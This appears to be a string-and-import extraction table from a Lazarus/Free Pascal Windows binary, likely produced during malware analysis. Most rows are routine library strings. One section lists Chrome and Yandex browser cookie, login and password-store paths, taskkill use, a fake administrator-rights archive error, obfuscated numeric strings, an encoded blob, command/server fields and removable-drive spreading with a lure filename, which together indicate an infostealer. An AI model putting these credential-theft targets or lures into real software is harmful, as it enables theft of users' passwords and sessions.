reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4027b0	0x60ae90	import	0x4027b0	gdi32.dll.GetTextColor
0x4027c0	0x60ae94	import	0x4027c0	gdi32.dll.GetViewportExtEx
0x4027d0	0x60ae98	import	0x4027d0	gdi32.dll.GetViewportOrgEx
0x4027e0	0x60ae9c	import	0x4027e0	gdi32.dll.GetWindowExtEx
0x4027f0	0x60aea0	import	0x4027f0	gdi32.dll.GetWindowOrgEx
0x402800	0x60aea4	import	0x402800	gdi32.dll.IntersectClipRect
0x402810	0x60aea8	import	0x402810	gdi32.dll.LineTo
0x402820	0x60aeac	import	0x402820	gdi32.dll.MaskBlt
0x402830	0x60aeb0	import	0x402830	gdi32.dll.OffsetRgn
0x402840	0x60aeb4	import	0x402840	gdi32.dll.PatBlt
0x402850	0x60aeb8	import	0x402850	gdi32.dll.Pie
0x402860	0x60aebc	import	0x402860	gdi32.dll.PaintRgn
0x402870	0x60aec0	import	0x402870	gdi32.dll.PtInRegion
0x402880	0x60aec4	import	0x402880	gdi32.dll.RectInRegion
0x402890	0x60aec8	import	0x402890	gdi32.dll.RectVisible
0x4028a0	0x60aecc	import	0x4028a0	gdi32.dll.Rectangle
0x4028b0	0x60aed0	import	0x4028b0	gdi32.dll.RestoreDC
0x4028c0	0x60aed4	import	0x4028c0	gdi32.dll.RealizePalette
0x4028d0	0x60aed8	import	0x4028d0	gdi32.dll.RoundRect
0x4028e0	0x60aedc	import	0x4028e0	gdi32.dll.SaveDC
0x4028f0	0x60aee0	import	0x4028f0	gdi32.dll.SelectClipRgn
0x402900	0x60aee4	import	0x402900	gdi32.dll.ExtSelectClipRgn
0x402910	0x60aee8	import	0x402910	gdi32.dll.SelectObject
0x402920	0x60aeec	import	0x402920	gdi32.dll.SelectPalette
0x402930	0x60aef0	import	0x402930	gdi32.dll.SetBkColor
0x402940	0x60aef4	import	0x402940	gdi32.dll.SetBkMode
0x402950	0x60aef8	import	0x402950	gdi32.dll.SetMapMode
0x402960	0x60aefc	import	0x402960	gdi32.dll.SetPixel
0x402970	0x60af00	import	0x402970	gdi32.dll.SetPolyFillMode
0x402980	0x60af04	import	0x402980	gdi32.dll.StretchBlt
0x402990	0x60af08	import	0x402990	gdi32.dll.SetRectRgn
0x4029a0	0x60af0c	import	0x4029a0	gdi32.dll.SetROP2
0x4029b0	0x60af10	import	0x4029b0	gdi32.dll.SetStretchBltMode
0x4029c0	0x60af14	import	0x4029c0	gdi32.dll.SetTextCharacterExtra
0x4029d0	0x60af18	import	0x4029d0	gdi32.dll.SetTextColor
0x4029e0	0x60af1c	import	0x4029e0	gdi32.dll.SetTextAlign
0x4029f0	0x60af20	import	0x4029f0	gdi32.dll.CreateDIBSection
0x402a00	0x60af24	import	0x402a00	gdi32.dll.SetArcDirection
0x402a10	0x60af28	import	0x402a10	gdi32.dll.ExtCreatePen
0x402a20	0x60af2c	import	0x402a20	gdi32.dll.MoveToEx
0x402a30	0x60af30	import	0x402a30	gdi32.dll.CreatePolygonRgn
0x402a40	0x60af34	import	0x402a40	gdi32.dll.DPtoLP
0x402a50	0x60af38	import	0x402a50	gdi32.dll.LPtoDP
0x402a60	0x60af3c	import	0x402a60	gdi32.dll.Polygon
0x402a70	0x60af40	import	0x402a70	gdi32.dll.Polyline
0x402a80	0x60af44	import	0x402a80	gdi32.dll.PolyBezier
0x402a90	0x60af48	import	0x402a90	gdi32.dll.SetViewportExtEx
0x402aa0	0x60af4c	import	0x402aa0	gdi32.dll.SetViewportOrgEx
0x402ab0	0x60af50	import	0x402ab0	gdi32.dll.SetWindowExtEx
0x402ac0	0x60af54	import	0x402ac0	gdi32.dll.SetWindowOrgEx
0x402ad0	0x60af58	import	0x402ad0	gdi32.dll.OffsetViewportOrgEx
0x402ae0	0x60af5c	import	0x402ae0	gdi32.dll.SetBrushOrgEx
0x402af0	0x60af60	import	0x402af0	gdi32.dll.GetDCOrgEx
0x402b00	0x60af68	import	0x402b00	version.dll.GetFileVersionInfoSizeA
0x402b10	0x60af6c	import	0x402b10	version.dll.GetFileVersionInfoA
0x402b20	0x60af70	import	0x402b20	version.dll.VerQueryValueA
0x402b30	0x60af78	import	0x402b30	shell32.dll.DragQueryFileA
0x402b40	0x60af7c	import	0x402b40	shell32.dll.ShellExecuteA
0x402b50	0x60af80	import	0x402b50	shell32.dll.DragQueryFileW
0x402b60	0x60af84	import	0x402b60	shell32.dll.DragFinish
0x402b70	0x60af88	import	0x402b70	shell32.dll.DragAcceptFiles
0x402b80	0x60af90	import	0x402b80	ole32.dll.OleInitialize
0x402b90	0x60af94	import	0x402b90	ole32.dll.OleUninitialize
0x402ba0	0x60af9c	import	0x402ba0	comctl32.dll.InitCommonControls
0x402bb0	0x60afa0	import	0x402bb0	comctl32.dll.ImageList_Create
0x402bc0	0x60afa4	import	0x402bc0	comctl32.dll.ImageList_Destroy
0x402bd0	0x60afa8	import	0x402bd0	comctl32.dll.ImageList_GetImageCount
0x402be0	0x60afac	import	0x402be0	comctl32.dll.ImageList_SetImageCount
0x402bf0	0x60afb0	import	0x402bf0	comctl32.dll.ImageList_Add
0x402c00	0x60afb4	import	0x402c00	comctl32.dll.ImageList_Replace
0x402c10	0x60afb8	import	0x402c10	comctl32.dll.ImageList_AddMasked
0x402c20	0x60afbc	import	0x402c20	comctl32.dll.ImageList_DrawEx
0x402c30	0x60afc0	import	0x402c30	comctl32.dll.ImageList_DrawIndirect
0x402c40	0x60afc4	import	0x402c40	comctl32.dll.ImageList_Remove
0x402c50	0x60afc8	import	0x402c50	comctl32.dll.ImageList_Copy
0x402c60	0x60afcc	import	0x402c60	comctl32.dll.ImageList_BeginDrag
0x402c70	0x60afd0	import	0x402c70	comctl32.dll.ImageList_EndDrag
0x402c80	0x60afd4	import	0x402c80	comctl32.dll.ImageList_DragEnter
0x402c90	0x60afd8	import	0x402c90	comctl32.dll.ImageList_DragLeave
0x402ca0	0x60afdc	import	0x402ca0	comctl32.dll.ImageList_DragMove
0x402cb0	0x60afe0	import	0x402cb0	comctl32.dll.ImageList_DragShowNolock
0x402cc0	0x60afe4	import	0x402cc0	comctl32.dll._TrackMouseEvent
0x402cd0	0x60afec	import	0x402cd0	ws2_32.dll.closesocket
0x402ce0	0x60aff0	import	0x402ce0	ws2_32.dll.connect
0x402cf0	0x60aff4	import	0x402cf0	ws2_32.dll.ioctlsocket
0x402d00	0x60aff8	import	0x402d00	ws2_32.dll.getsockopt
0x402d10	0x60affc	import	0x402d10	ws2_32.dll.recv
0x402d20	0x60b000	import	0x402d20	ws2_32.dll.select
0x402d30	0x60b004	import	0x402d30	ws2_32.dll.send
0x402d40	0x60b008	import	0x402d40	ws2_32.dll.setsockopt
0x402d50	0x60b00c	import	0x402d50	ws2_32.dll.shutdown
0x402d60	0x60b010	import	0x402d60	ws2_32.dll.socket
0x402d70	0x60b014	import	0x402d70	wsock32.dll.WSAStartup
0x402d80	0x60b018	import	0x402d80	ws2_32.dll.WSACleanup
0x402d90	0x60b01c	import	0x402d90	ws2_32.dll.WSAGetLastError
0x402da0	0x60b020	import	0x402da0	ws2_32.dll.__WSAFDIsSet
0x402db0	0x60b028	import	0x402db0	wsock32.dll.gethostbyaddr
0x402dc0	0x60b02c	import	0x402dc0	wsock32.dll.gethostbyname
0x406e3d	0x406e50	string	0x406ca0	f1ۊE blocks=Basic Latin,Arabic
0x408b74	0x408bad	string	0x408b40	9t$\b
0x408ba2	0x408bb3	string	0x408b40	9t$\b~\f
0x40cc0a	0x598240	string	0x40cbe0	9This binary has no string conversion support compiled in.
0x40cc4d	0x59827c	string	0x40cbe0	gRecompile the application with a unit that installs a unicodestring manager in the program uses clause.
0x40d800	0x40d80d	string	0x40d730	1\tD$
0x40dd70	0x40dd7d	string	0x40dcf0	1\tD$
0x40f710	0x410fa0	string	0x40f470	SVWf
0x410284	0x410250	string	0x410280	S0ۋP\b blocks=Basic Latin,Arabic
0x41089c	0x410870	string	0x410810	;x\bw\e
0x410d5a	0x410250	string	0x410ca0	S0ۋP\b blocks=Basic Latin,Arabic
0x411d02	0x598330	string	0x411b70	kernel32
0x411d11	0x59833c	string	0x411b70	SetThreadDescription
0x41564d	0x598758	string	0x4154e0	#Tail modified after release at pos
0x41578f	0x59871c	string	0x415750	\b invalid
0x4157ae	0x598780	string	0x415750	\rWrong size :
0x4157d2	0x598790	string	0x415750	\v allocated
0x4158d8	0x5987a8	string	0x415860	%error in linked list of heap_mem_info
0x415900	0x5987a8	string	0x415860	%error in linked list of heap_mem_info
0x41597a	0x5987a8	string	0x415860	%error in linked list of heap_mem_info
0x4159a2	0x5987a8	string	0x415860	%error in linked list of heap_mem_info
0x416a8f	0x598900	string	0x416a10	$", writing output to stderr instead.
0x416c13	0x598948	string	0x416bc0	\vExitcode =
0x416c77	0x598948	string	0x416bc0	\vExitcode =
0x416ec1	0x598958	string	0x416eb0	\aHEAPTRC
0x416ed6	0x598964	string	0x416eb0	\fkeepreleased
0x416ef7	0x598974	string	0x416eb0	\bdisabled
0x416f57	0x59899c	string	0x416eb0	\rskipifnoleaks
0x416f77	0x5989ac	string	0x416eb0	\ntail_size=
0x416f94	0x5989ac	string	0x416eb0	\ntail_size=
0x417385	0x59adcc	string	0x417340	[FORMS.PP] ExceptionOccurred
0x417418	0x59adf8	string	0x417340	Sender=
0x41746a	0x59ae10	string	0x417340	Exception=
0x417485	0x59ae2c	string	0x417340	Sender=nil
0x41e04e	0x59aeb0	string	0x41df90	TCustomForm.SetActiveControl
0x41e081	0x59aedc	string	0x41df90	AWinControl=
0x41e0ae	0x59aef8	string	0x41df90	GetParentForm(AWinControl)=
0x41e0e2	0x59af24	string	0x41df90	=Self=
0x41e10e	0x59af38	string	0x41df90	csLoading=
0x41e137	0x59af50	string	0x41df90	AWinControl.CanFocus=
0x41e161	0x59af74	string	0x41df90	IsControlVisible=
0x41e18b	0x59af94	string	0x41df90	Enabled=
0x41e1fd	0x59af74	string	0x41df90	IsControlVisible=
0x41e227	0x59af94	string	0x41df90	Enabled=
0x41e251	0x59afbc	string	0x41df90	CanFocus=
0x420b44	0x59b198	string	0x420b10	VCL compatibility property
0x420b49	0x59b1c0	string	0x420b10	OldCreateOrder
0x420b5a	0x59b198	string	0x420b10	VCL compatibility property
0x420b5f	0x59b1dc	string	0x420b10	TextHeight
0x420b70	0x59b198	string	0x420b10	VCL compatibility property
0x420b75	0x59b1f4	string	0x420b10	Scaled
0x420b86	0x59b198	string	0x420b10	VCL compatibility property
0x420b8b	0x59b208	string	0x420b10	TransparentColorValue
0x420beb	0x59ae58	string	0x420bd0	2.2.2.0
0x420c5b	0x59ae58	string	0x420bd0	2.2.2.0
0x421660	0x59b22c	string	0x421620	TScreen.MoveFormToFocusFront
0x421e04	0x59b280	string	0x421d40	Unbalanced BeginTempCursor/EndTempCursor calls for cursor %d
0x4220a4	0x59b2cc	string	0x421fc0	TScreen.MonitorFromPoint
0x42240e	0x59b318	string	0x422360	TScreen.MonitorFromWindow
0x423888	0x59b354	string	0x423860	TApplication.Destroy Self=nil
0x424678	0x59b39c	string	0x424610	ERROR:
0x4246dd	0x59b3b0	string	0x424610	MAINICON
0x4246f9	0x59b3b0	string	0x424610	MAINICON
0x42471b	0x59b3bc	string	0x424610	MAINICON
0x424d93	0x5cfd18	string	0x424d90	\r\tTHintInfo
0x426b08	0x59b408	string	0x426af0	TApplication.EnableIdleHandler
0x427d05	0x59b470	string	0x427cf0	HINT: TApplication.FreeComponent Data<>0 ignored
0x429eb4	0x59d628	string	0x429da0	8200-8282-9676-9102-9184-9512-3444-3772-8282-9840-8282
0x429f2c	0x59d66c	string	0x429da0	devopt
0x429f55	0x59d680	string	0x429da0	.exe
0x429f8f	0x59d3c4	string	0x429da0	NOT WRITTEN\n
0x429fa6	0x59d694	string	0x429da0	ZIP Error 0020C (Требуется запуск распаковки архива с правами администратора) blocks=Basic Latin,Cyrillic
0x42a123	0x59d724	string	0x429da0	DEVICE_ID
0x42a12e	0x59d73c	string	0x429da0	Windows
0x42a28a	0x59d760	string	0x429da0	Version
0x42a295	0x59d73c	string	0x429da0	Windows
0x42a2d6	0x59d784	string	0x429da0	OwnVer
0x42a2e1	0x59d73c	string	0x429da0	Windows
0x42a332	0x59d798	string	0x429da0	Address
0x42a33d	0x59d7ac	string	0x429da0	Server
0x42b600	0x59dbbc	string	0x42b5f0	uninitialized function result in function GetProcessNameByID(Parametr:LongWord):AnsiString;
0x42b84e	0x59dc24	string	0x42b7e0	chrome.exe
0x42b87d	0x59dc54	string	0x42b7e0	\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies
0x42b8b2	0x59dca0	string	0x42b7e0	\AppData\Local\Google\Chrome\User Data\Default\History
0x42b8e7	0x59dce4	string	0x42b7e0	\AppData\Local\Google\Chrome\User Data\Default\Login Data
0x42b91c	0x59dd2c	string	0x42b7e0	\AppData\Local\Google\Chrome\User Data\Last Version
0x42b93c	0x59dc3c	string	0x42b7e0	browser.exe
0x42b96b	0x59dd6c	string	0x42b7e0	\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies
0x42b9a0	0x59ddc0	string	0x42b7e0	\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\History
0x42b9d5	0x59de14	string	0x42b7e0	\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data
0x42ba0a	0x59de68	string	0x42b7e0	\AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Autofill Data
0x42ba4e	0x59debc	string	0x42b7e0	/IM
0x42ba81	0x59ded4	string	0x42b7e0	taskkill
0x42ba87	0x59dee0	string	0x42b7e0	open
0x42bb3e	0x59def4	string	0x42b7e0	dck.bin
0x42bc2d	0x59def4	string	0x42b7e0	dck.bin
0x42bde6	0x59df08	string	0x42bd00	5576-5986-6724
0x42be56	0x59df24	string	0x42bd00	6724-5658-5330-5576
0x42beee	0x59df44	string	0x42bd00	6560-6970-6888
0x42bf29	0x59df44	string	0x42bd00	6560-6970-6888
0x42bfc2	0x59df60	string	0x42bd00	6560-6724-6232-6806
0x42c02e	0x59df80	string	0x42bd00	5658-7216-5658-5494
0x42c078	0x59dfa0	string	0x42bd00	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
0x42c0a2	0x59dee0	string	0x42bd00	open
0x42c0e1	0x59df80	string	0x42bd00	5658-7216-5658-5494
0x42c0f7	0x5aa300	string	0x42bd00	UTED
0x42c142	0x5aa314	string	0x42bd00	6806-7298-6396-5494
0x42c173	0x5aa334	string	0x42bd00	SYNCRONIZED V
0x42c1ca	0x5aa350	string	0x42bd00	5576-6724-6232-6806
0x42c244	0x5aa370	string	0x42bd00	READ
0x42c2db	0x5aa384	string	0x42bd00	command
0x42c320	0x5aa370	string	0x42bd00	READ
0x42c411	0x5aa384	string	0x42bd00	command
0x42c4db	0x5aa384	string	0x42bd00	command
0x42d248	0x5aa5b8	string	0x42d030	Data
0x42d2c2	0x5aa5b8	string	0x42d030	Data
0x42ddd0	0x59dac8	string	0x42dd30	[REMOVABLE]
0x42ddfa	0x59daf4	string	0x42dd30	[NETWORK]
0x42de4c	0x5aa71c	string	0x42dd30	сиськи*.exe blocks=Cyrillic,Basic Latin
0x42dea7	0x5aa73c	string	0x42dd30	сиськи blocks=Cyrillic
0x42ded0	0x59d680	string	0x42dd30	.exe
0x42e0ce	0x5aa758	string	0x42e060	arxiv
0x42e17a	0x5aa73c	string	0x42e060	сиськи blocks=Cyrillic
0x42e4c9	0x5aa76c	string	0x42e490	READ\n
0x42e51f	0x5aa76c	string	0x42e490	READ\n
0x42e99c	0x5aace0	string	0x42e930	\r\fprocess_list
0x42f726	0x5ac2bc	string	0x42f560	m/d/yy
0x42f753	0x5ac2d0	string	0x42f560	mmmm d, yyyy
0x42f880	0x5ac330	string	0x42f560	:nn:ss
0x434b5f	0x5ac950	string	0x434b40	WARNING: CreateEllipticRgn not yet implemented.
0x4350d5	0x5ac98c	string	0x4350c0	TWidgetSet.DeleteCriticalSection Not implemented yet
0x4365e5	0x5ac9d0	string	0x4365d0	TWidgetSet.EnterCriticalSection Not implemented yet
0x436638	0x5aca10	string	0x436620	EnumFontFamilies is not yet implemented for this widgetset
0x436678	0x5aca58	string	0x436620	EnumFontFamiliesEx is not yet implemented for this widgetset
0x438185	0x5acabc	string	0x438170	TWidgetSet.InitializeCriticalSection Not implemented yet
0x438385	0x5acb04	string	0x438370	TWidgetSet.LeaveCriticalSection Not implemented yet
0x43a1ec	0x5acb38	string	0x43a1d0	WinControl
0x43b0fe	0x43b102	string	0x43b0e0	;{\btQ
0x43b2f9	0x43b3b0	string	0x43b1b0	;P\f~\a
0x43dcd1	0x43dce4	string	0x43dcc0	;s\ft
0x43e03a	0x43e044	string	0x43e010	;{\b}\e
0x43e525	0x5af454	string	0x43e510	&{BC7376EA-199C-4C2A-8684-F4805F0691CA}
0x43e5c5	0x5af454	string	0x43e510	&{BC7376EA-199C-4C2A-8684-F4805F0691CA}
0x43fd76	0x598468	string	0x43fd70	\t\nAnsiString
0x43fdd3	0x598468	string	0x43fd90	\t\nAnsiString
0x4415dd	0x4415f0	string	0x4415a0	;s<~j
0x441953	0x44dc80	string	0x441900	SV1ɉÅ blocks=Basic Latin,Latin Extended-B,Latin-1 Supplement
0x442235	0x5af454	string	0x442220	&{BC7376EA-199C-4C2A-8684-F4805F0691CA}
0x4422d5	0x5af454	string	0x442220	&{BC7376EA-199C-4C2A-8684-F4805F0691CA}
0x449120	0x44912d	string	0x449090	1\tD$\b
0x449660	0x5af5b4	string	0x4495f0	FALSE
0x449689	0x5af5c8	string	0x4495f0	TRUE
0x4496b2	0x5af5a0	string	0x4495f0	NULL
0x44dd23	0x44dd5d	string	0x44dce0	9t$\b
0x45134e	0x5b2b6c	string	0x451310	True
0x45138f	0x5b2b80	string	0x451310	False
0x452185	0x5b2c2c	string	0x452170	ddddd
0x455f09	0x5b2d30	string	0x455ed0	Deadlock detected
0x45600e	0x5b2d50	string	0x455ed0	EndWrite called before BeginWrite
0x4560a1	0x5b2d80	string	0x456040	BasicEventWaitFor failed in TMultiReadExclusiveWriteSynchronizer.Beginread
0x45614a	0x5b2dd8	string	0x4560f0	EndRead called before BeginRead
0x4562f9	0x5b2e04	string	0x4562b0	TEMP
0x456c07	0x5b2e60	string	0x456ba0	$An unhandled exception occurred at $
0x456d0f	0x5b2ea0	string	0x456ba0	\e is not of class Exception.
0x456d36	0x5b2ec0	string	0x456ba0	&Exception object is not a valid class.
0x4573fe	0x5b2ef8	string	0x457350	%s:\n%s
0x4587dd	0x5b2f94	string	0x458690	m/d/yy
0x458809	0x5b2fa8	string	0x458690	mmmm d, yyyy
0x458938	0x5b2fd8	string	0x458690	:nn:ss
0x458fa5	0x5b2fe0	string	0x458f30	kernel32
0x458fb9	0x5b2fec	string	0x458f30	GetDiskFreeSpaceExA
0x45ebeb	0x5b82d0	string	0x45e950	Meta+
0x45ec17	0x5b82e4	string	0x45e950	Shift+
0x45ec43	0x5b82f8	string	0x45e950	Ctrl+
0x45ec6b	0x5b830c	string	0x45e950	Alt+
0x46568a	0x5b97d8	string	0x465680	Invalid Size
0x465702	0x5b97f4	string	0x4656e0	Invalid Raw Image Description Format
0x465866	0x5b9858	string	0x465820	Failed to get raw image from device
0x4658ca	0x5b9888	string	0x4658a0	Failed to get raw image description from bitmap
0x465958	0x5b98c4	string	0x4658a0	Failed to get raw image from bitmap
0x4659cc	0x5b98f4	string	0x4659a0	Failed to create handles
0x46649d	0x5b991c	string	0x4663f0	line too short
0x466567	0x5b9938	string	0x4663f0	invalid color
0x4665bc	0x5b9954	string	0x4663f0	reading XPM pixels
0x466f0f	0x5b9c0c	string	0x466ea0	hexnumber expected
0x467230	0x5b9c2c	string	0x467180	number expected
0x467510	0x5b9c90	string	0x4674b0	in xpm stream at line
0x467561	0x5b9cb4	string	0x4674b0	column
0x467dad	0x5b9ce4	string	0x467d70	TLazAVLPalette.ConsistencyCheck
0x467e14	0x5b9ce4	string	0x467d70	TLazAVLPalette.ConsistencyCheck
0x467e31	0x5b9ce4	string	0x467d70	TLazAVLPalette.ConsistencyCheck
0x467e49	0x5b9ce4	string	0x467d70	TLazAVLPalette.ConsistencyCheck
0x467e60	0x5b9ce4	string	0x467d70	TLazAVLPalette.ConsistencyCheck
0x4685f8	0x5b9ccc	string	0x4685a0	/* XPM */
0x46860a	0x5b9de8	string	0x4685a0	static char *graphic[] = {
0x46ad89	0x5b9ed0	string	0x46abb0	Bitmap with unknown compression (%d)
0x46add8	0x5b9f04	string	0x46abb0	Bitmap with unsupported compression (%s)
0x46ae73	0x5b9f3c	string	0x46abb0	Bitmap with wrong combination of bit count (%d) and compression (%s)
0x46b3aa	0x5b9f90	string	0x46b2d0	Wrong bitmap bit count: %d
0x46b533	0x5b9fb8	string	0x46b420	reading BMP pixels
0x46b624	0x5b9fb8	string	0x46b420	reading BMP pixels
0x46c4f0	0x5b9fd8	string	0x46c4e0	TLazWriterTiff - Lazarus LCL: 2.2.2.0 - FPC: 3.2.2
0x46c4f5	0x5ba018	string	0x46c4e0	LazTiffSoftware
0x46d867	0x57d170	string	0x46d850	UªUªUªUª blocks=Basic Latin,Latin-1 Supplement
0x470266	0x5bac08	string	0x470250	True
0x470275	0x5bac1c	string	0x470250	False
0x471e10	0x5bac8c	string	0x471d90	Duplicate LogGroup
0x4766be	0x5bb2bc	string	0x476620	.SetNodeClass Count=
0x476714	0x5bb2e0	string	0x476620	Old=
0x47674c	0x5bb2f4	string	0x476620	New=
0x477197	0x5bb308	string	0x477150	Count<>RealCount
0x477471	0x5bb350	string	0x477350	TAVLTree.Assign aTree=nil
0x477658	0x5bb378	string	0x4775b0	%p Self=%p Parent=%p Balance=%d
0x47776c	0x5bb3ac	string	0x4776e0	Left.Parent<>Self
0x477793	0x5bb3cc	string	0x4776e0	Compare(Left.Data,Data)>0
0x4777cb	0x5bb3f4	string	0x4776e0	Right.Parent<>Self
0x4777f3	0x5bb414	string	0x4776e0	Compare(Data,Right.Data)>0
0x477878	0x5bb43c	string	0x4776e0	Balance[
0x4778c5	0x5bb454	string	0x4776e0	]<>(RightDepth[
0x477912	0x5bb470	string	0x4776e0	]-LeftDepth[
0x477d6b	0x5bb4c8	string	0x477ce0	%s.DisposeNode: FCount (%d) is negative. Should not happen. FFreeCount=%d, FMinFree=%d, FMaxFreeRatio=%d.
0x479d68	0x5bd2b0	string	0x479d50	comctl32.dll
0x479d7c	0x5bd2c0	string	0x479d50	TaskDialogIndirect
0x479d9c	0x5bd2d4	string	0x479d50	TaskDialog
0x47d51b	0x479fe0	string	0x47d3b0	SVW0ҋH\b blocks=Basic Latin,Cyrillic
0x47e925	0x47e930	string	0x47e8f0	1\rd$
0x47fe6a	0x5bde78	string	0x47fdf0	String
0x47fefb	0x5bdeac	string	0x47fdf0	Array of
0x47ff17	0x5bdec4	string	0x47fdf0	Ref to
0x48035b	0x5bded8	string	0x480070	Invalid Property Type: %s
0x48648d	0x486430	string	0x486460	SV0۱ blocks=Basic Latin,Arabic
0x487ad3	0x5be610	string	0x487ac0	BMP Format
0x487c5d	0x5be724	string	0x487c40	Invalid color depth
0x489413	0x5be7cc	string	0x489400	BMP Format
0x48ab18	0x5bea10	string	0x48aaf0	Second IHDR chunk found
0x48aff3	0x5bea7c	string	0x48afe0	Portable Network Graphics
0x48b5de	0x5bebb0	string	0x48b500	Too many colors to use indexed PNG color type
0x48c703	0x5bec38	string	0x48c5e0	Portable Network Graphics
0x490025	0x5bf8a8	string	0x48feb0	only short or long allowed
0x49035c	0x5bf8fc	string	0x4902d0	missing PhotometricInterpretation
0x490374	0x5bf92c	string	0x4902d0	missing BitsPerSample
0x4903a5	0x5bf950	string	0x4902d0	missing TileLength
0x4903bf	0x5bf970	string	0x4902d0	missing TileOffsets
0x4903df	0x5bf990	string	0x4902d0	missing TileByteCounts
0x490404	0x5bf9b4	string	0x4902d0	missing RowsPerStrip
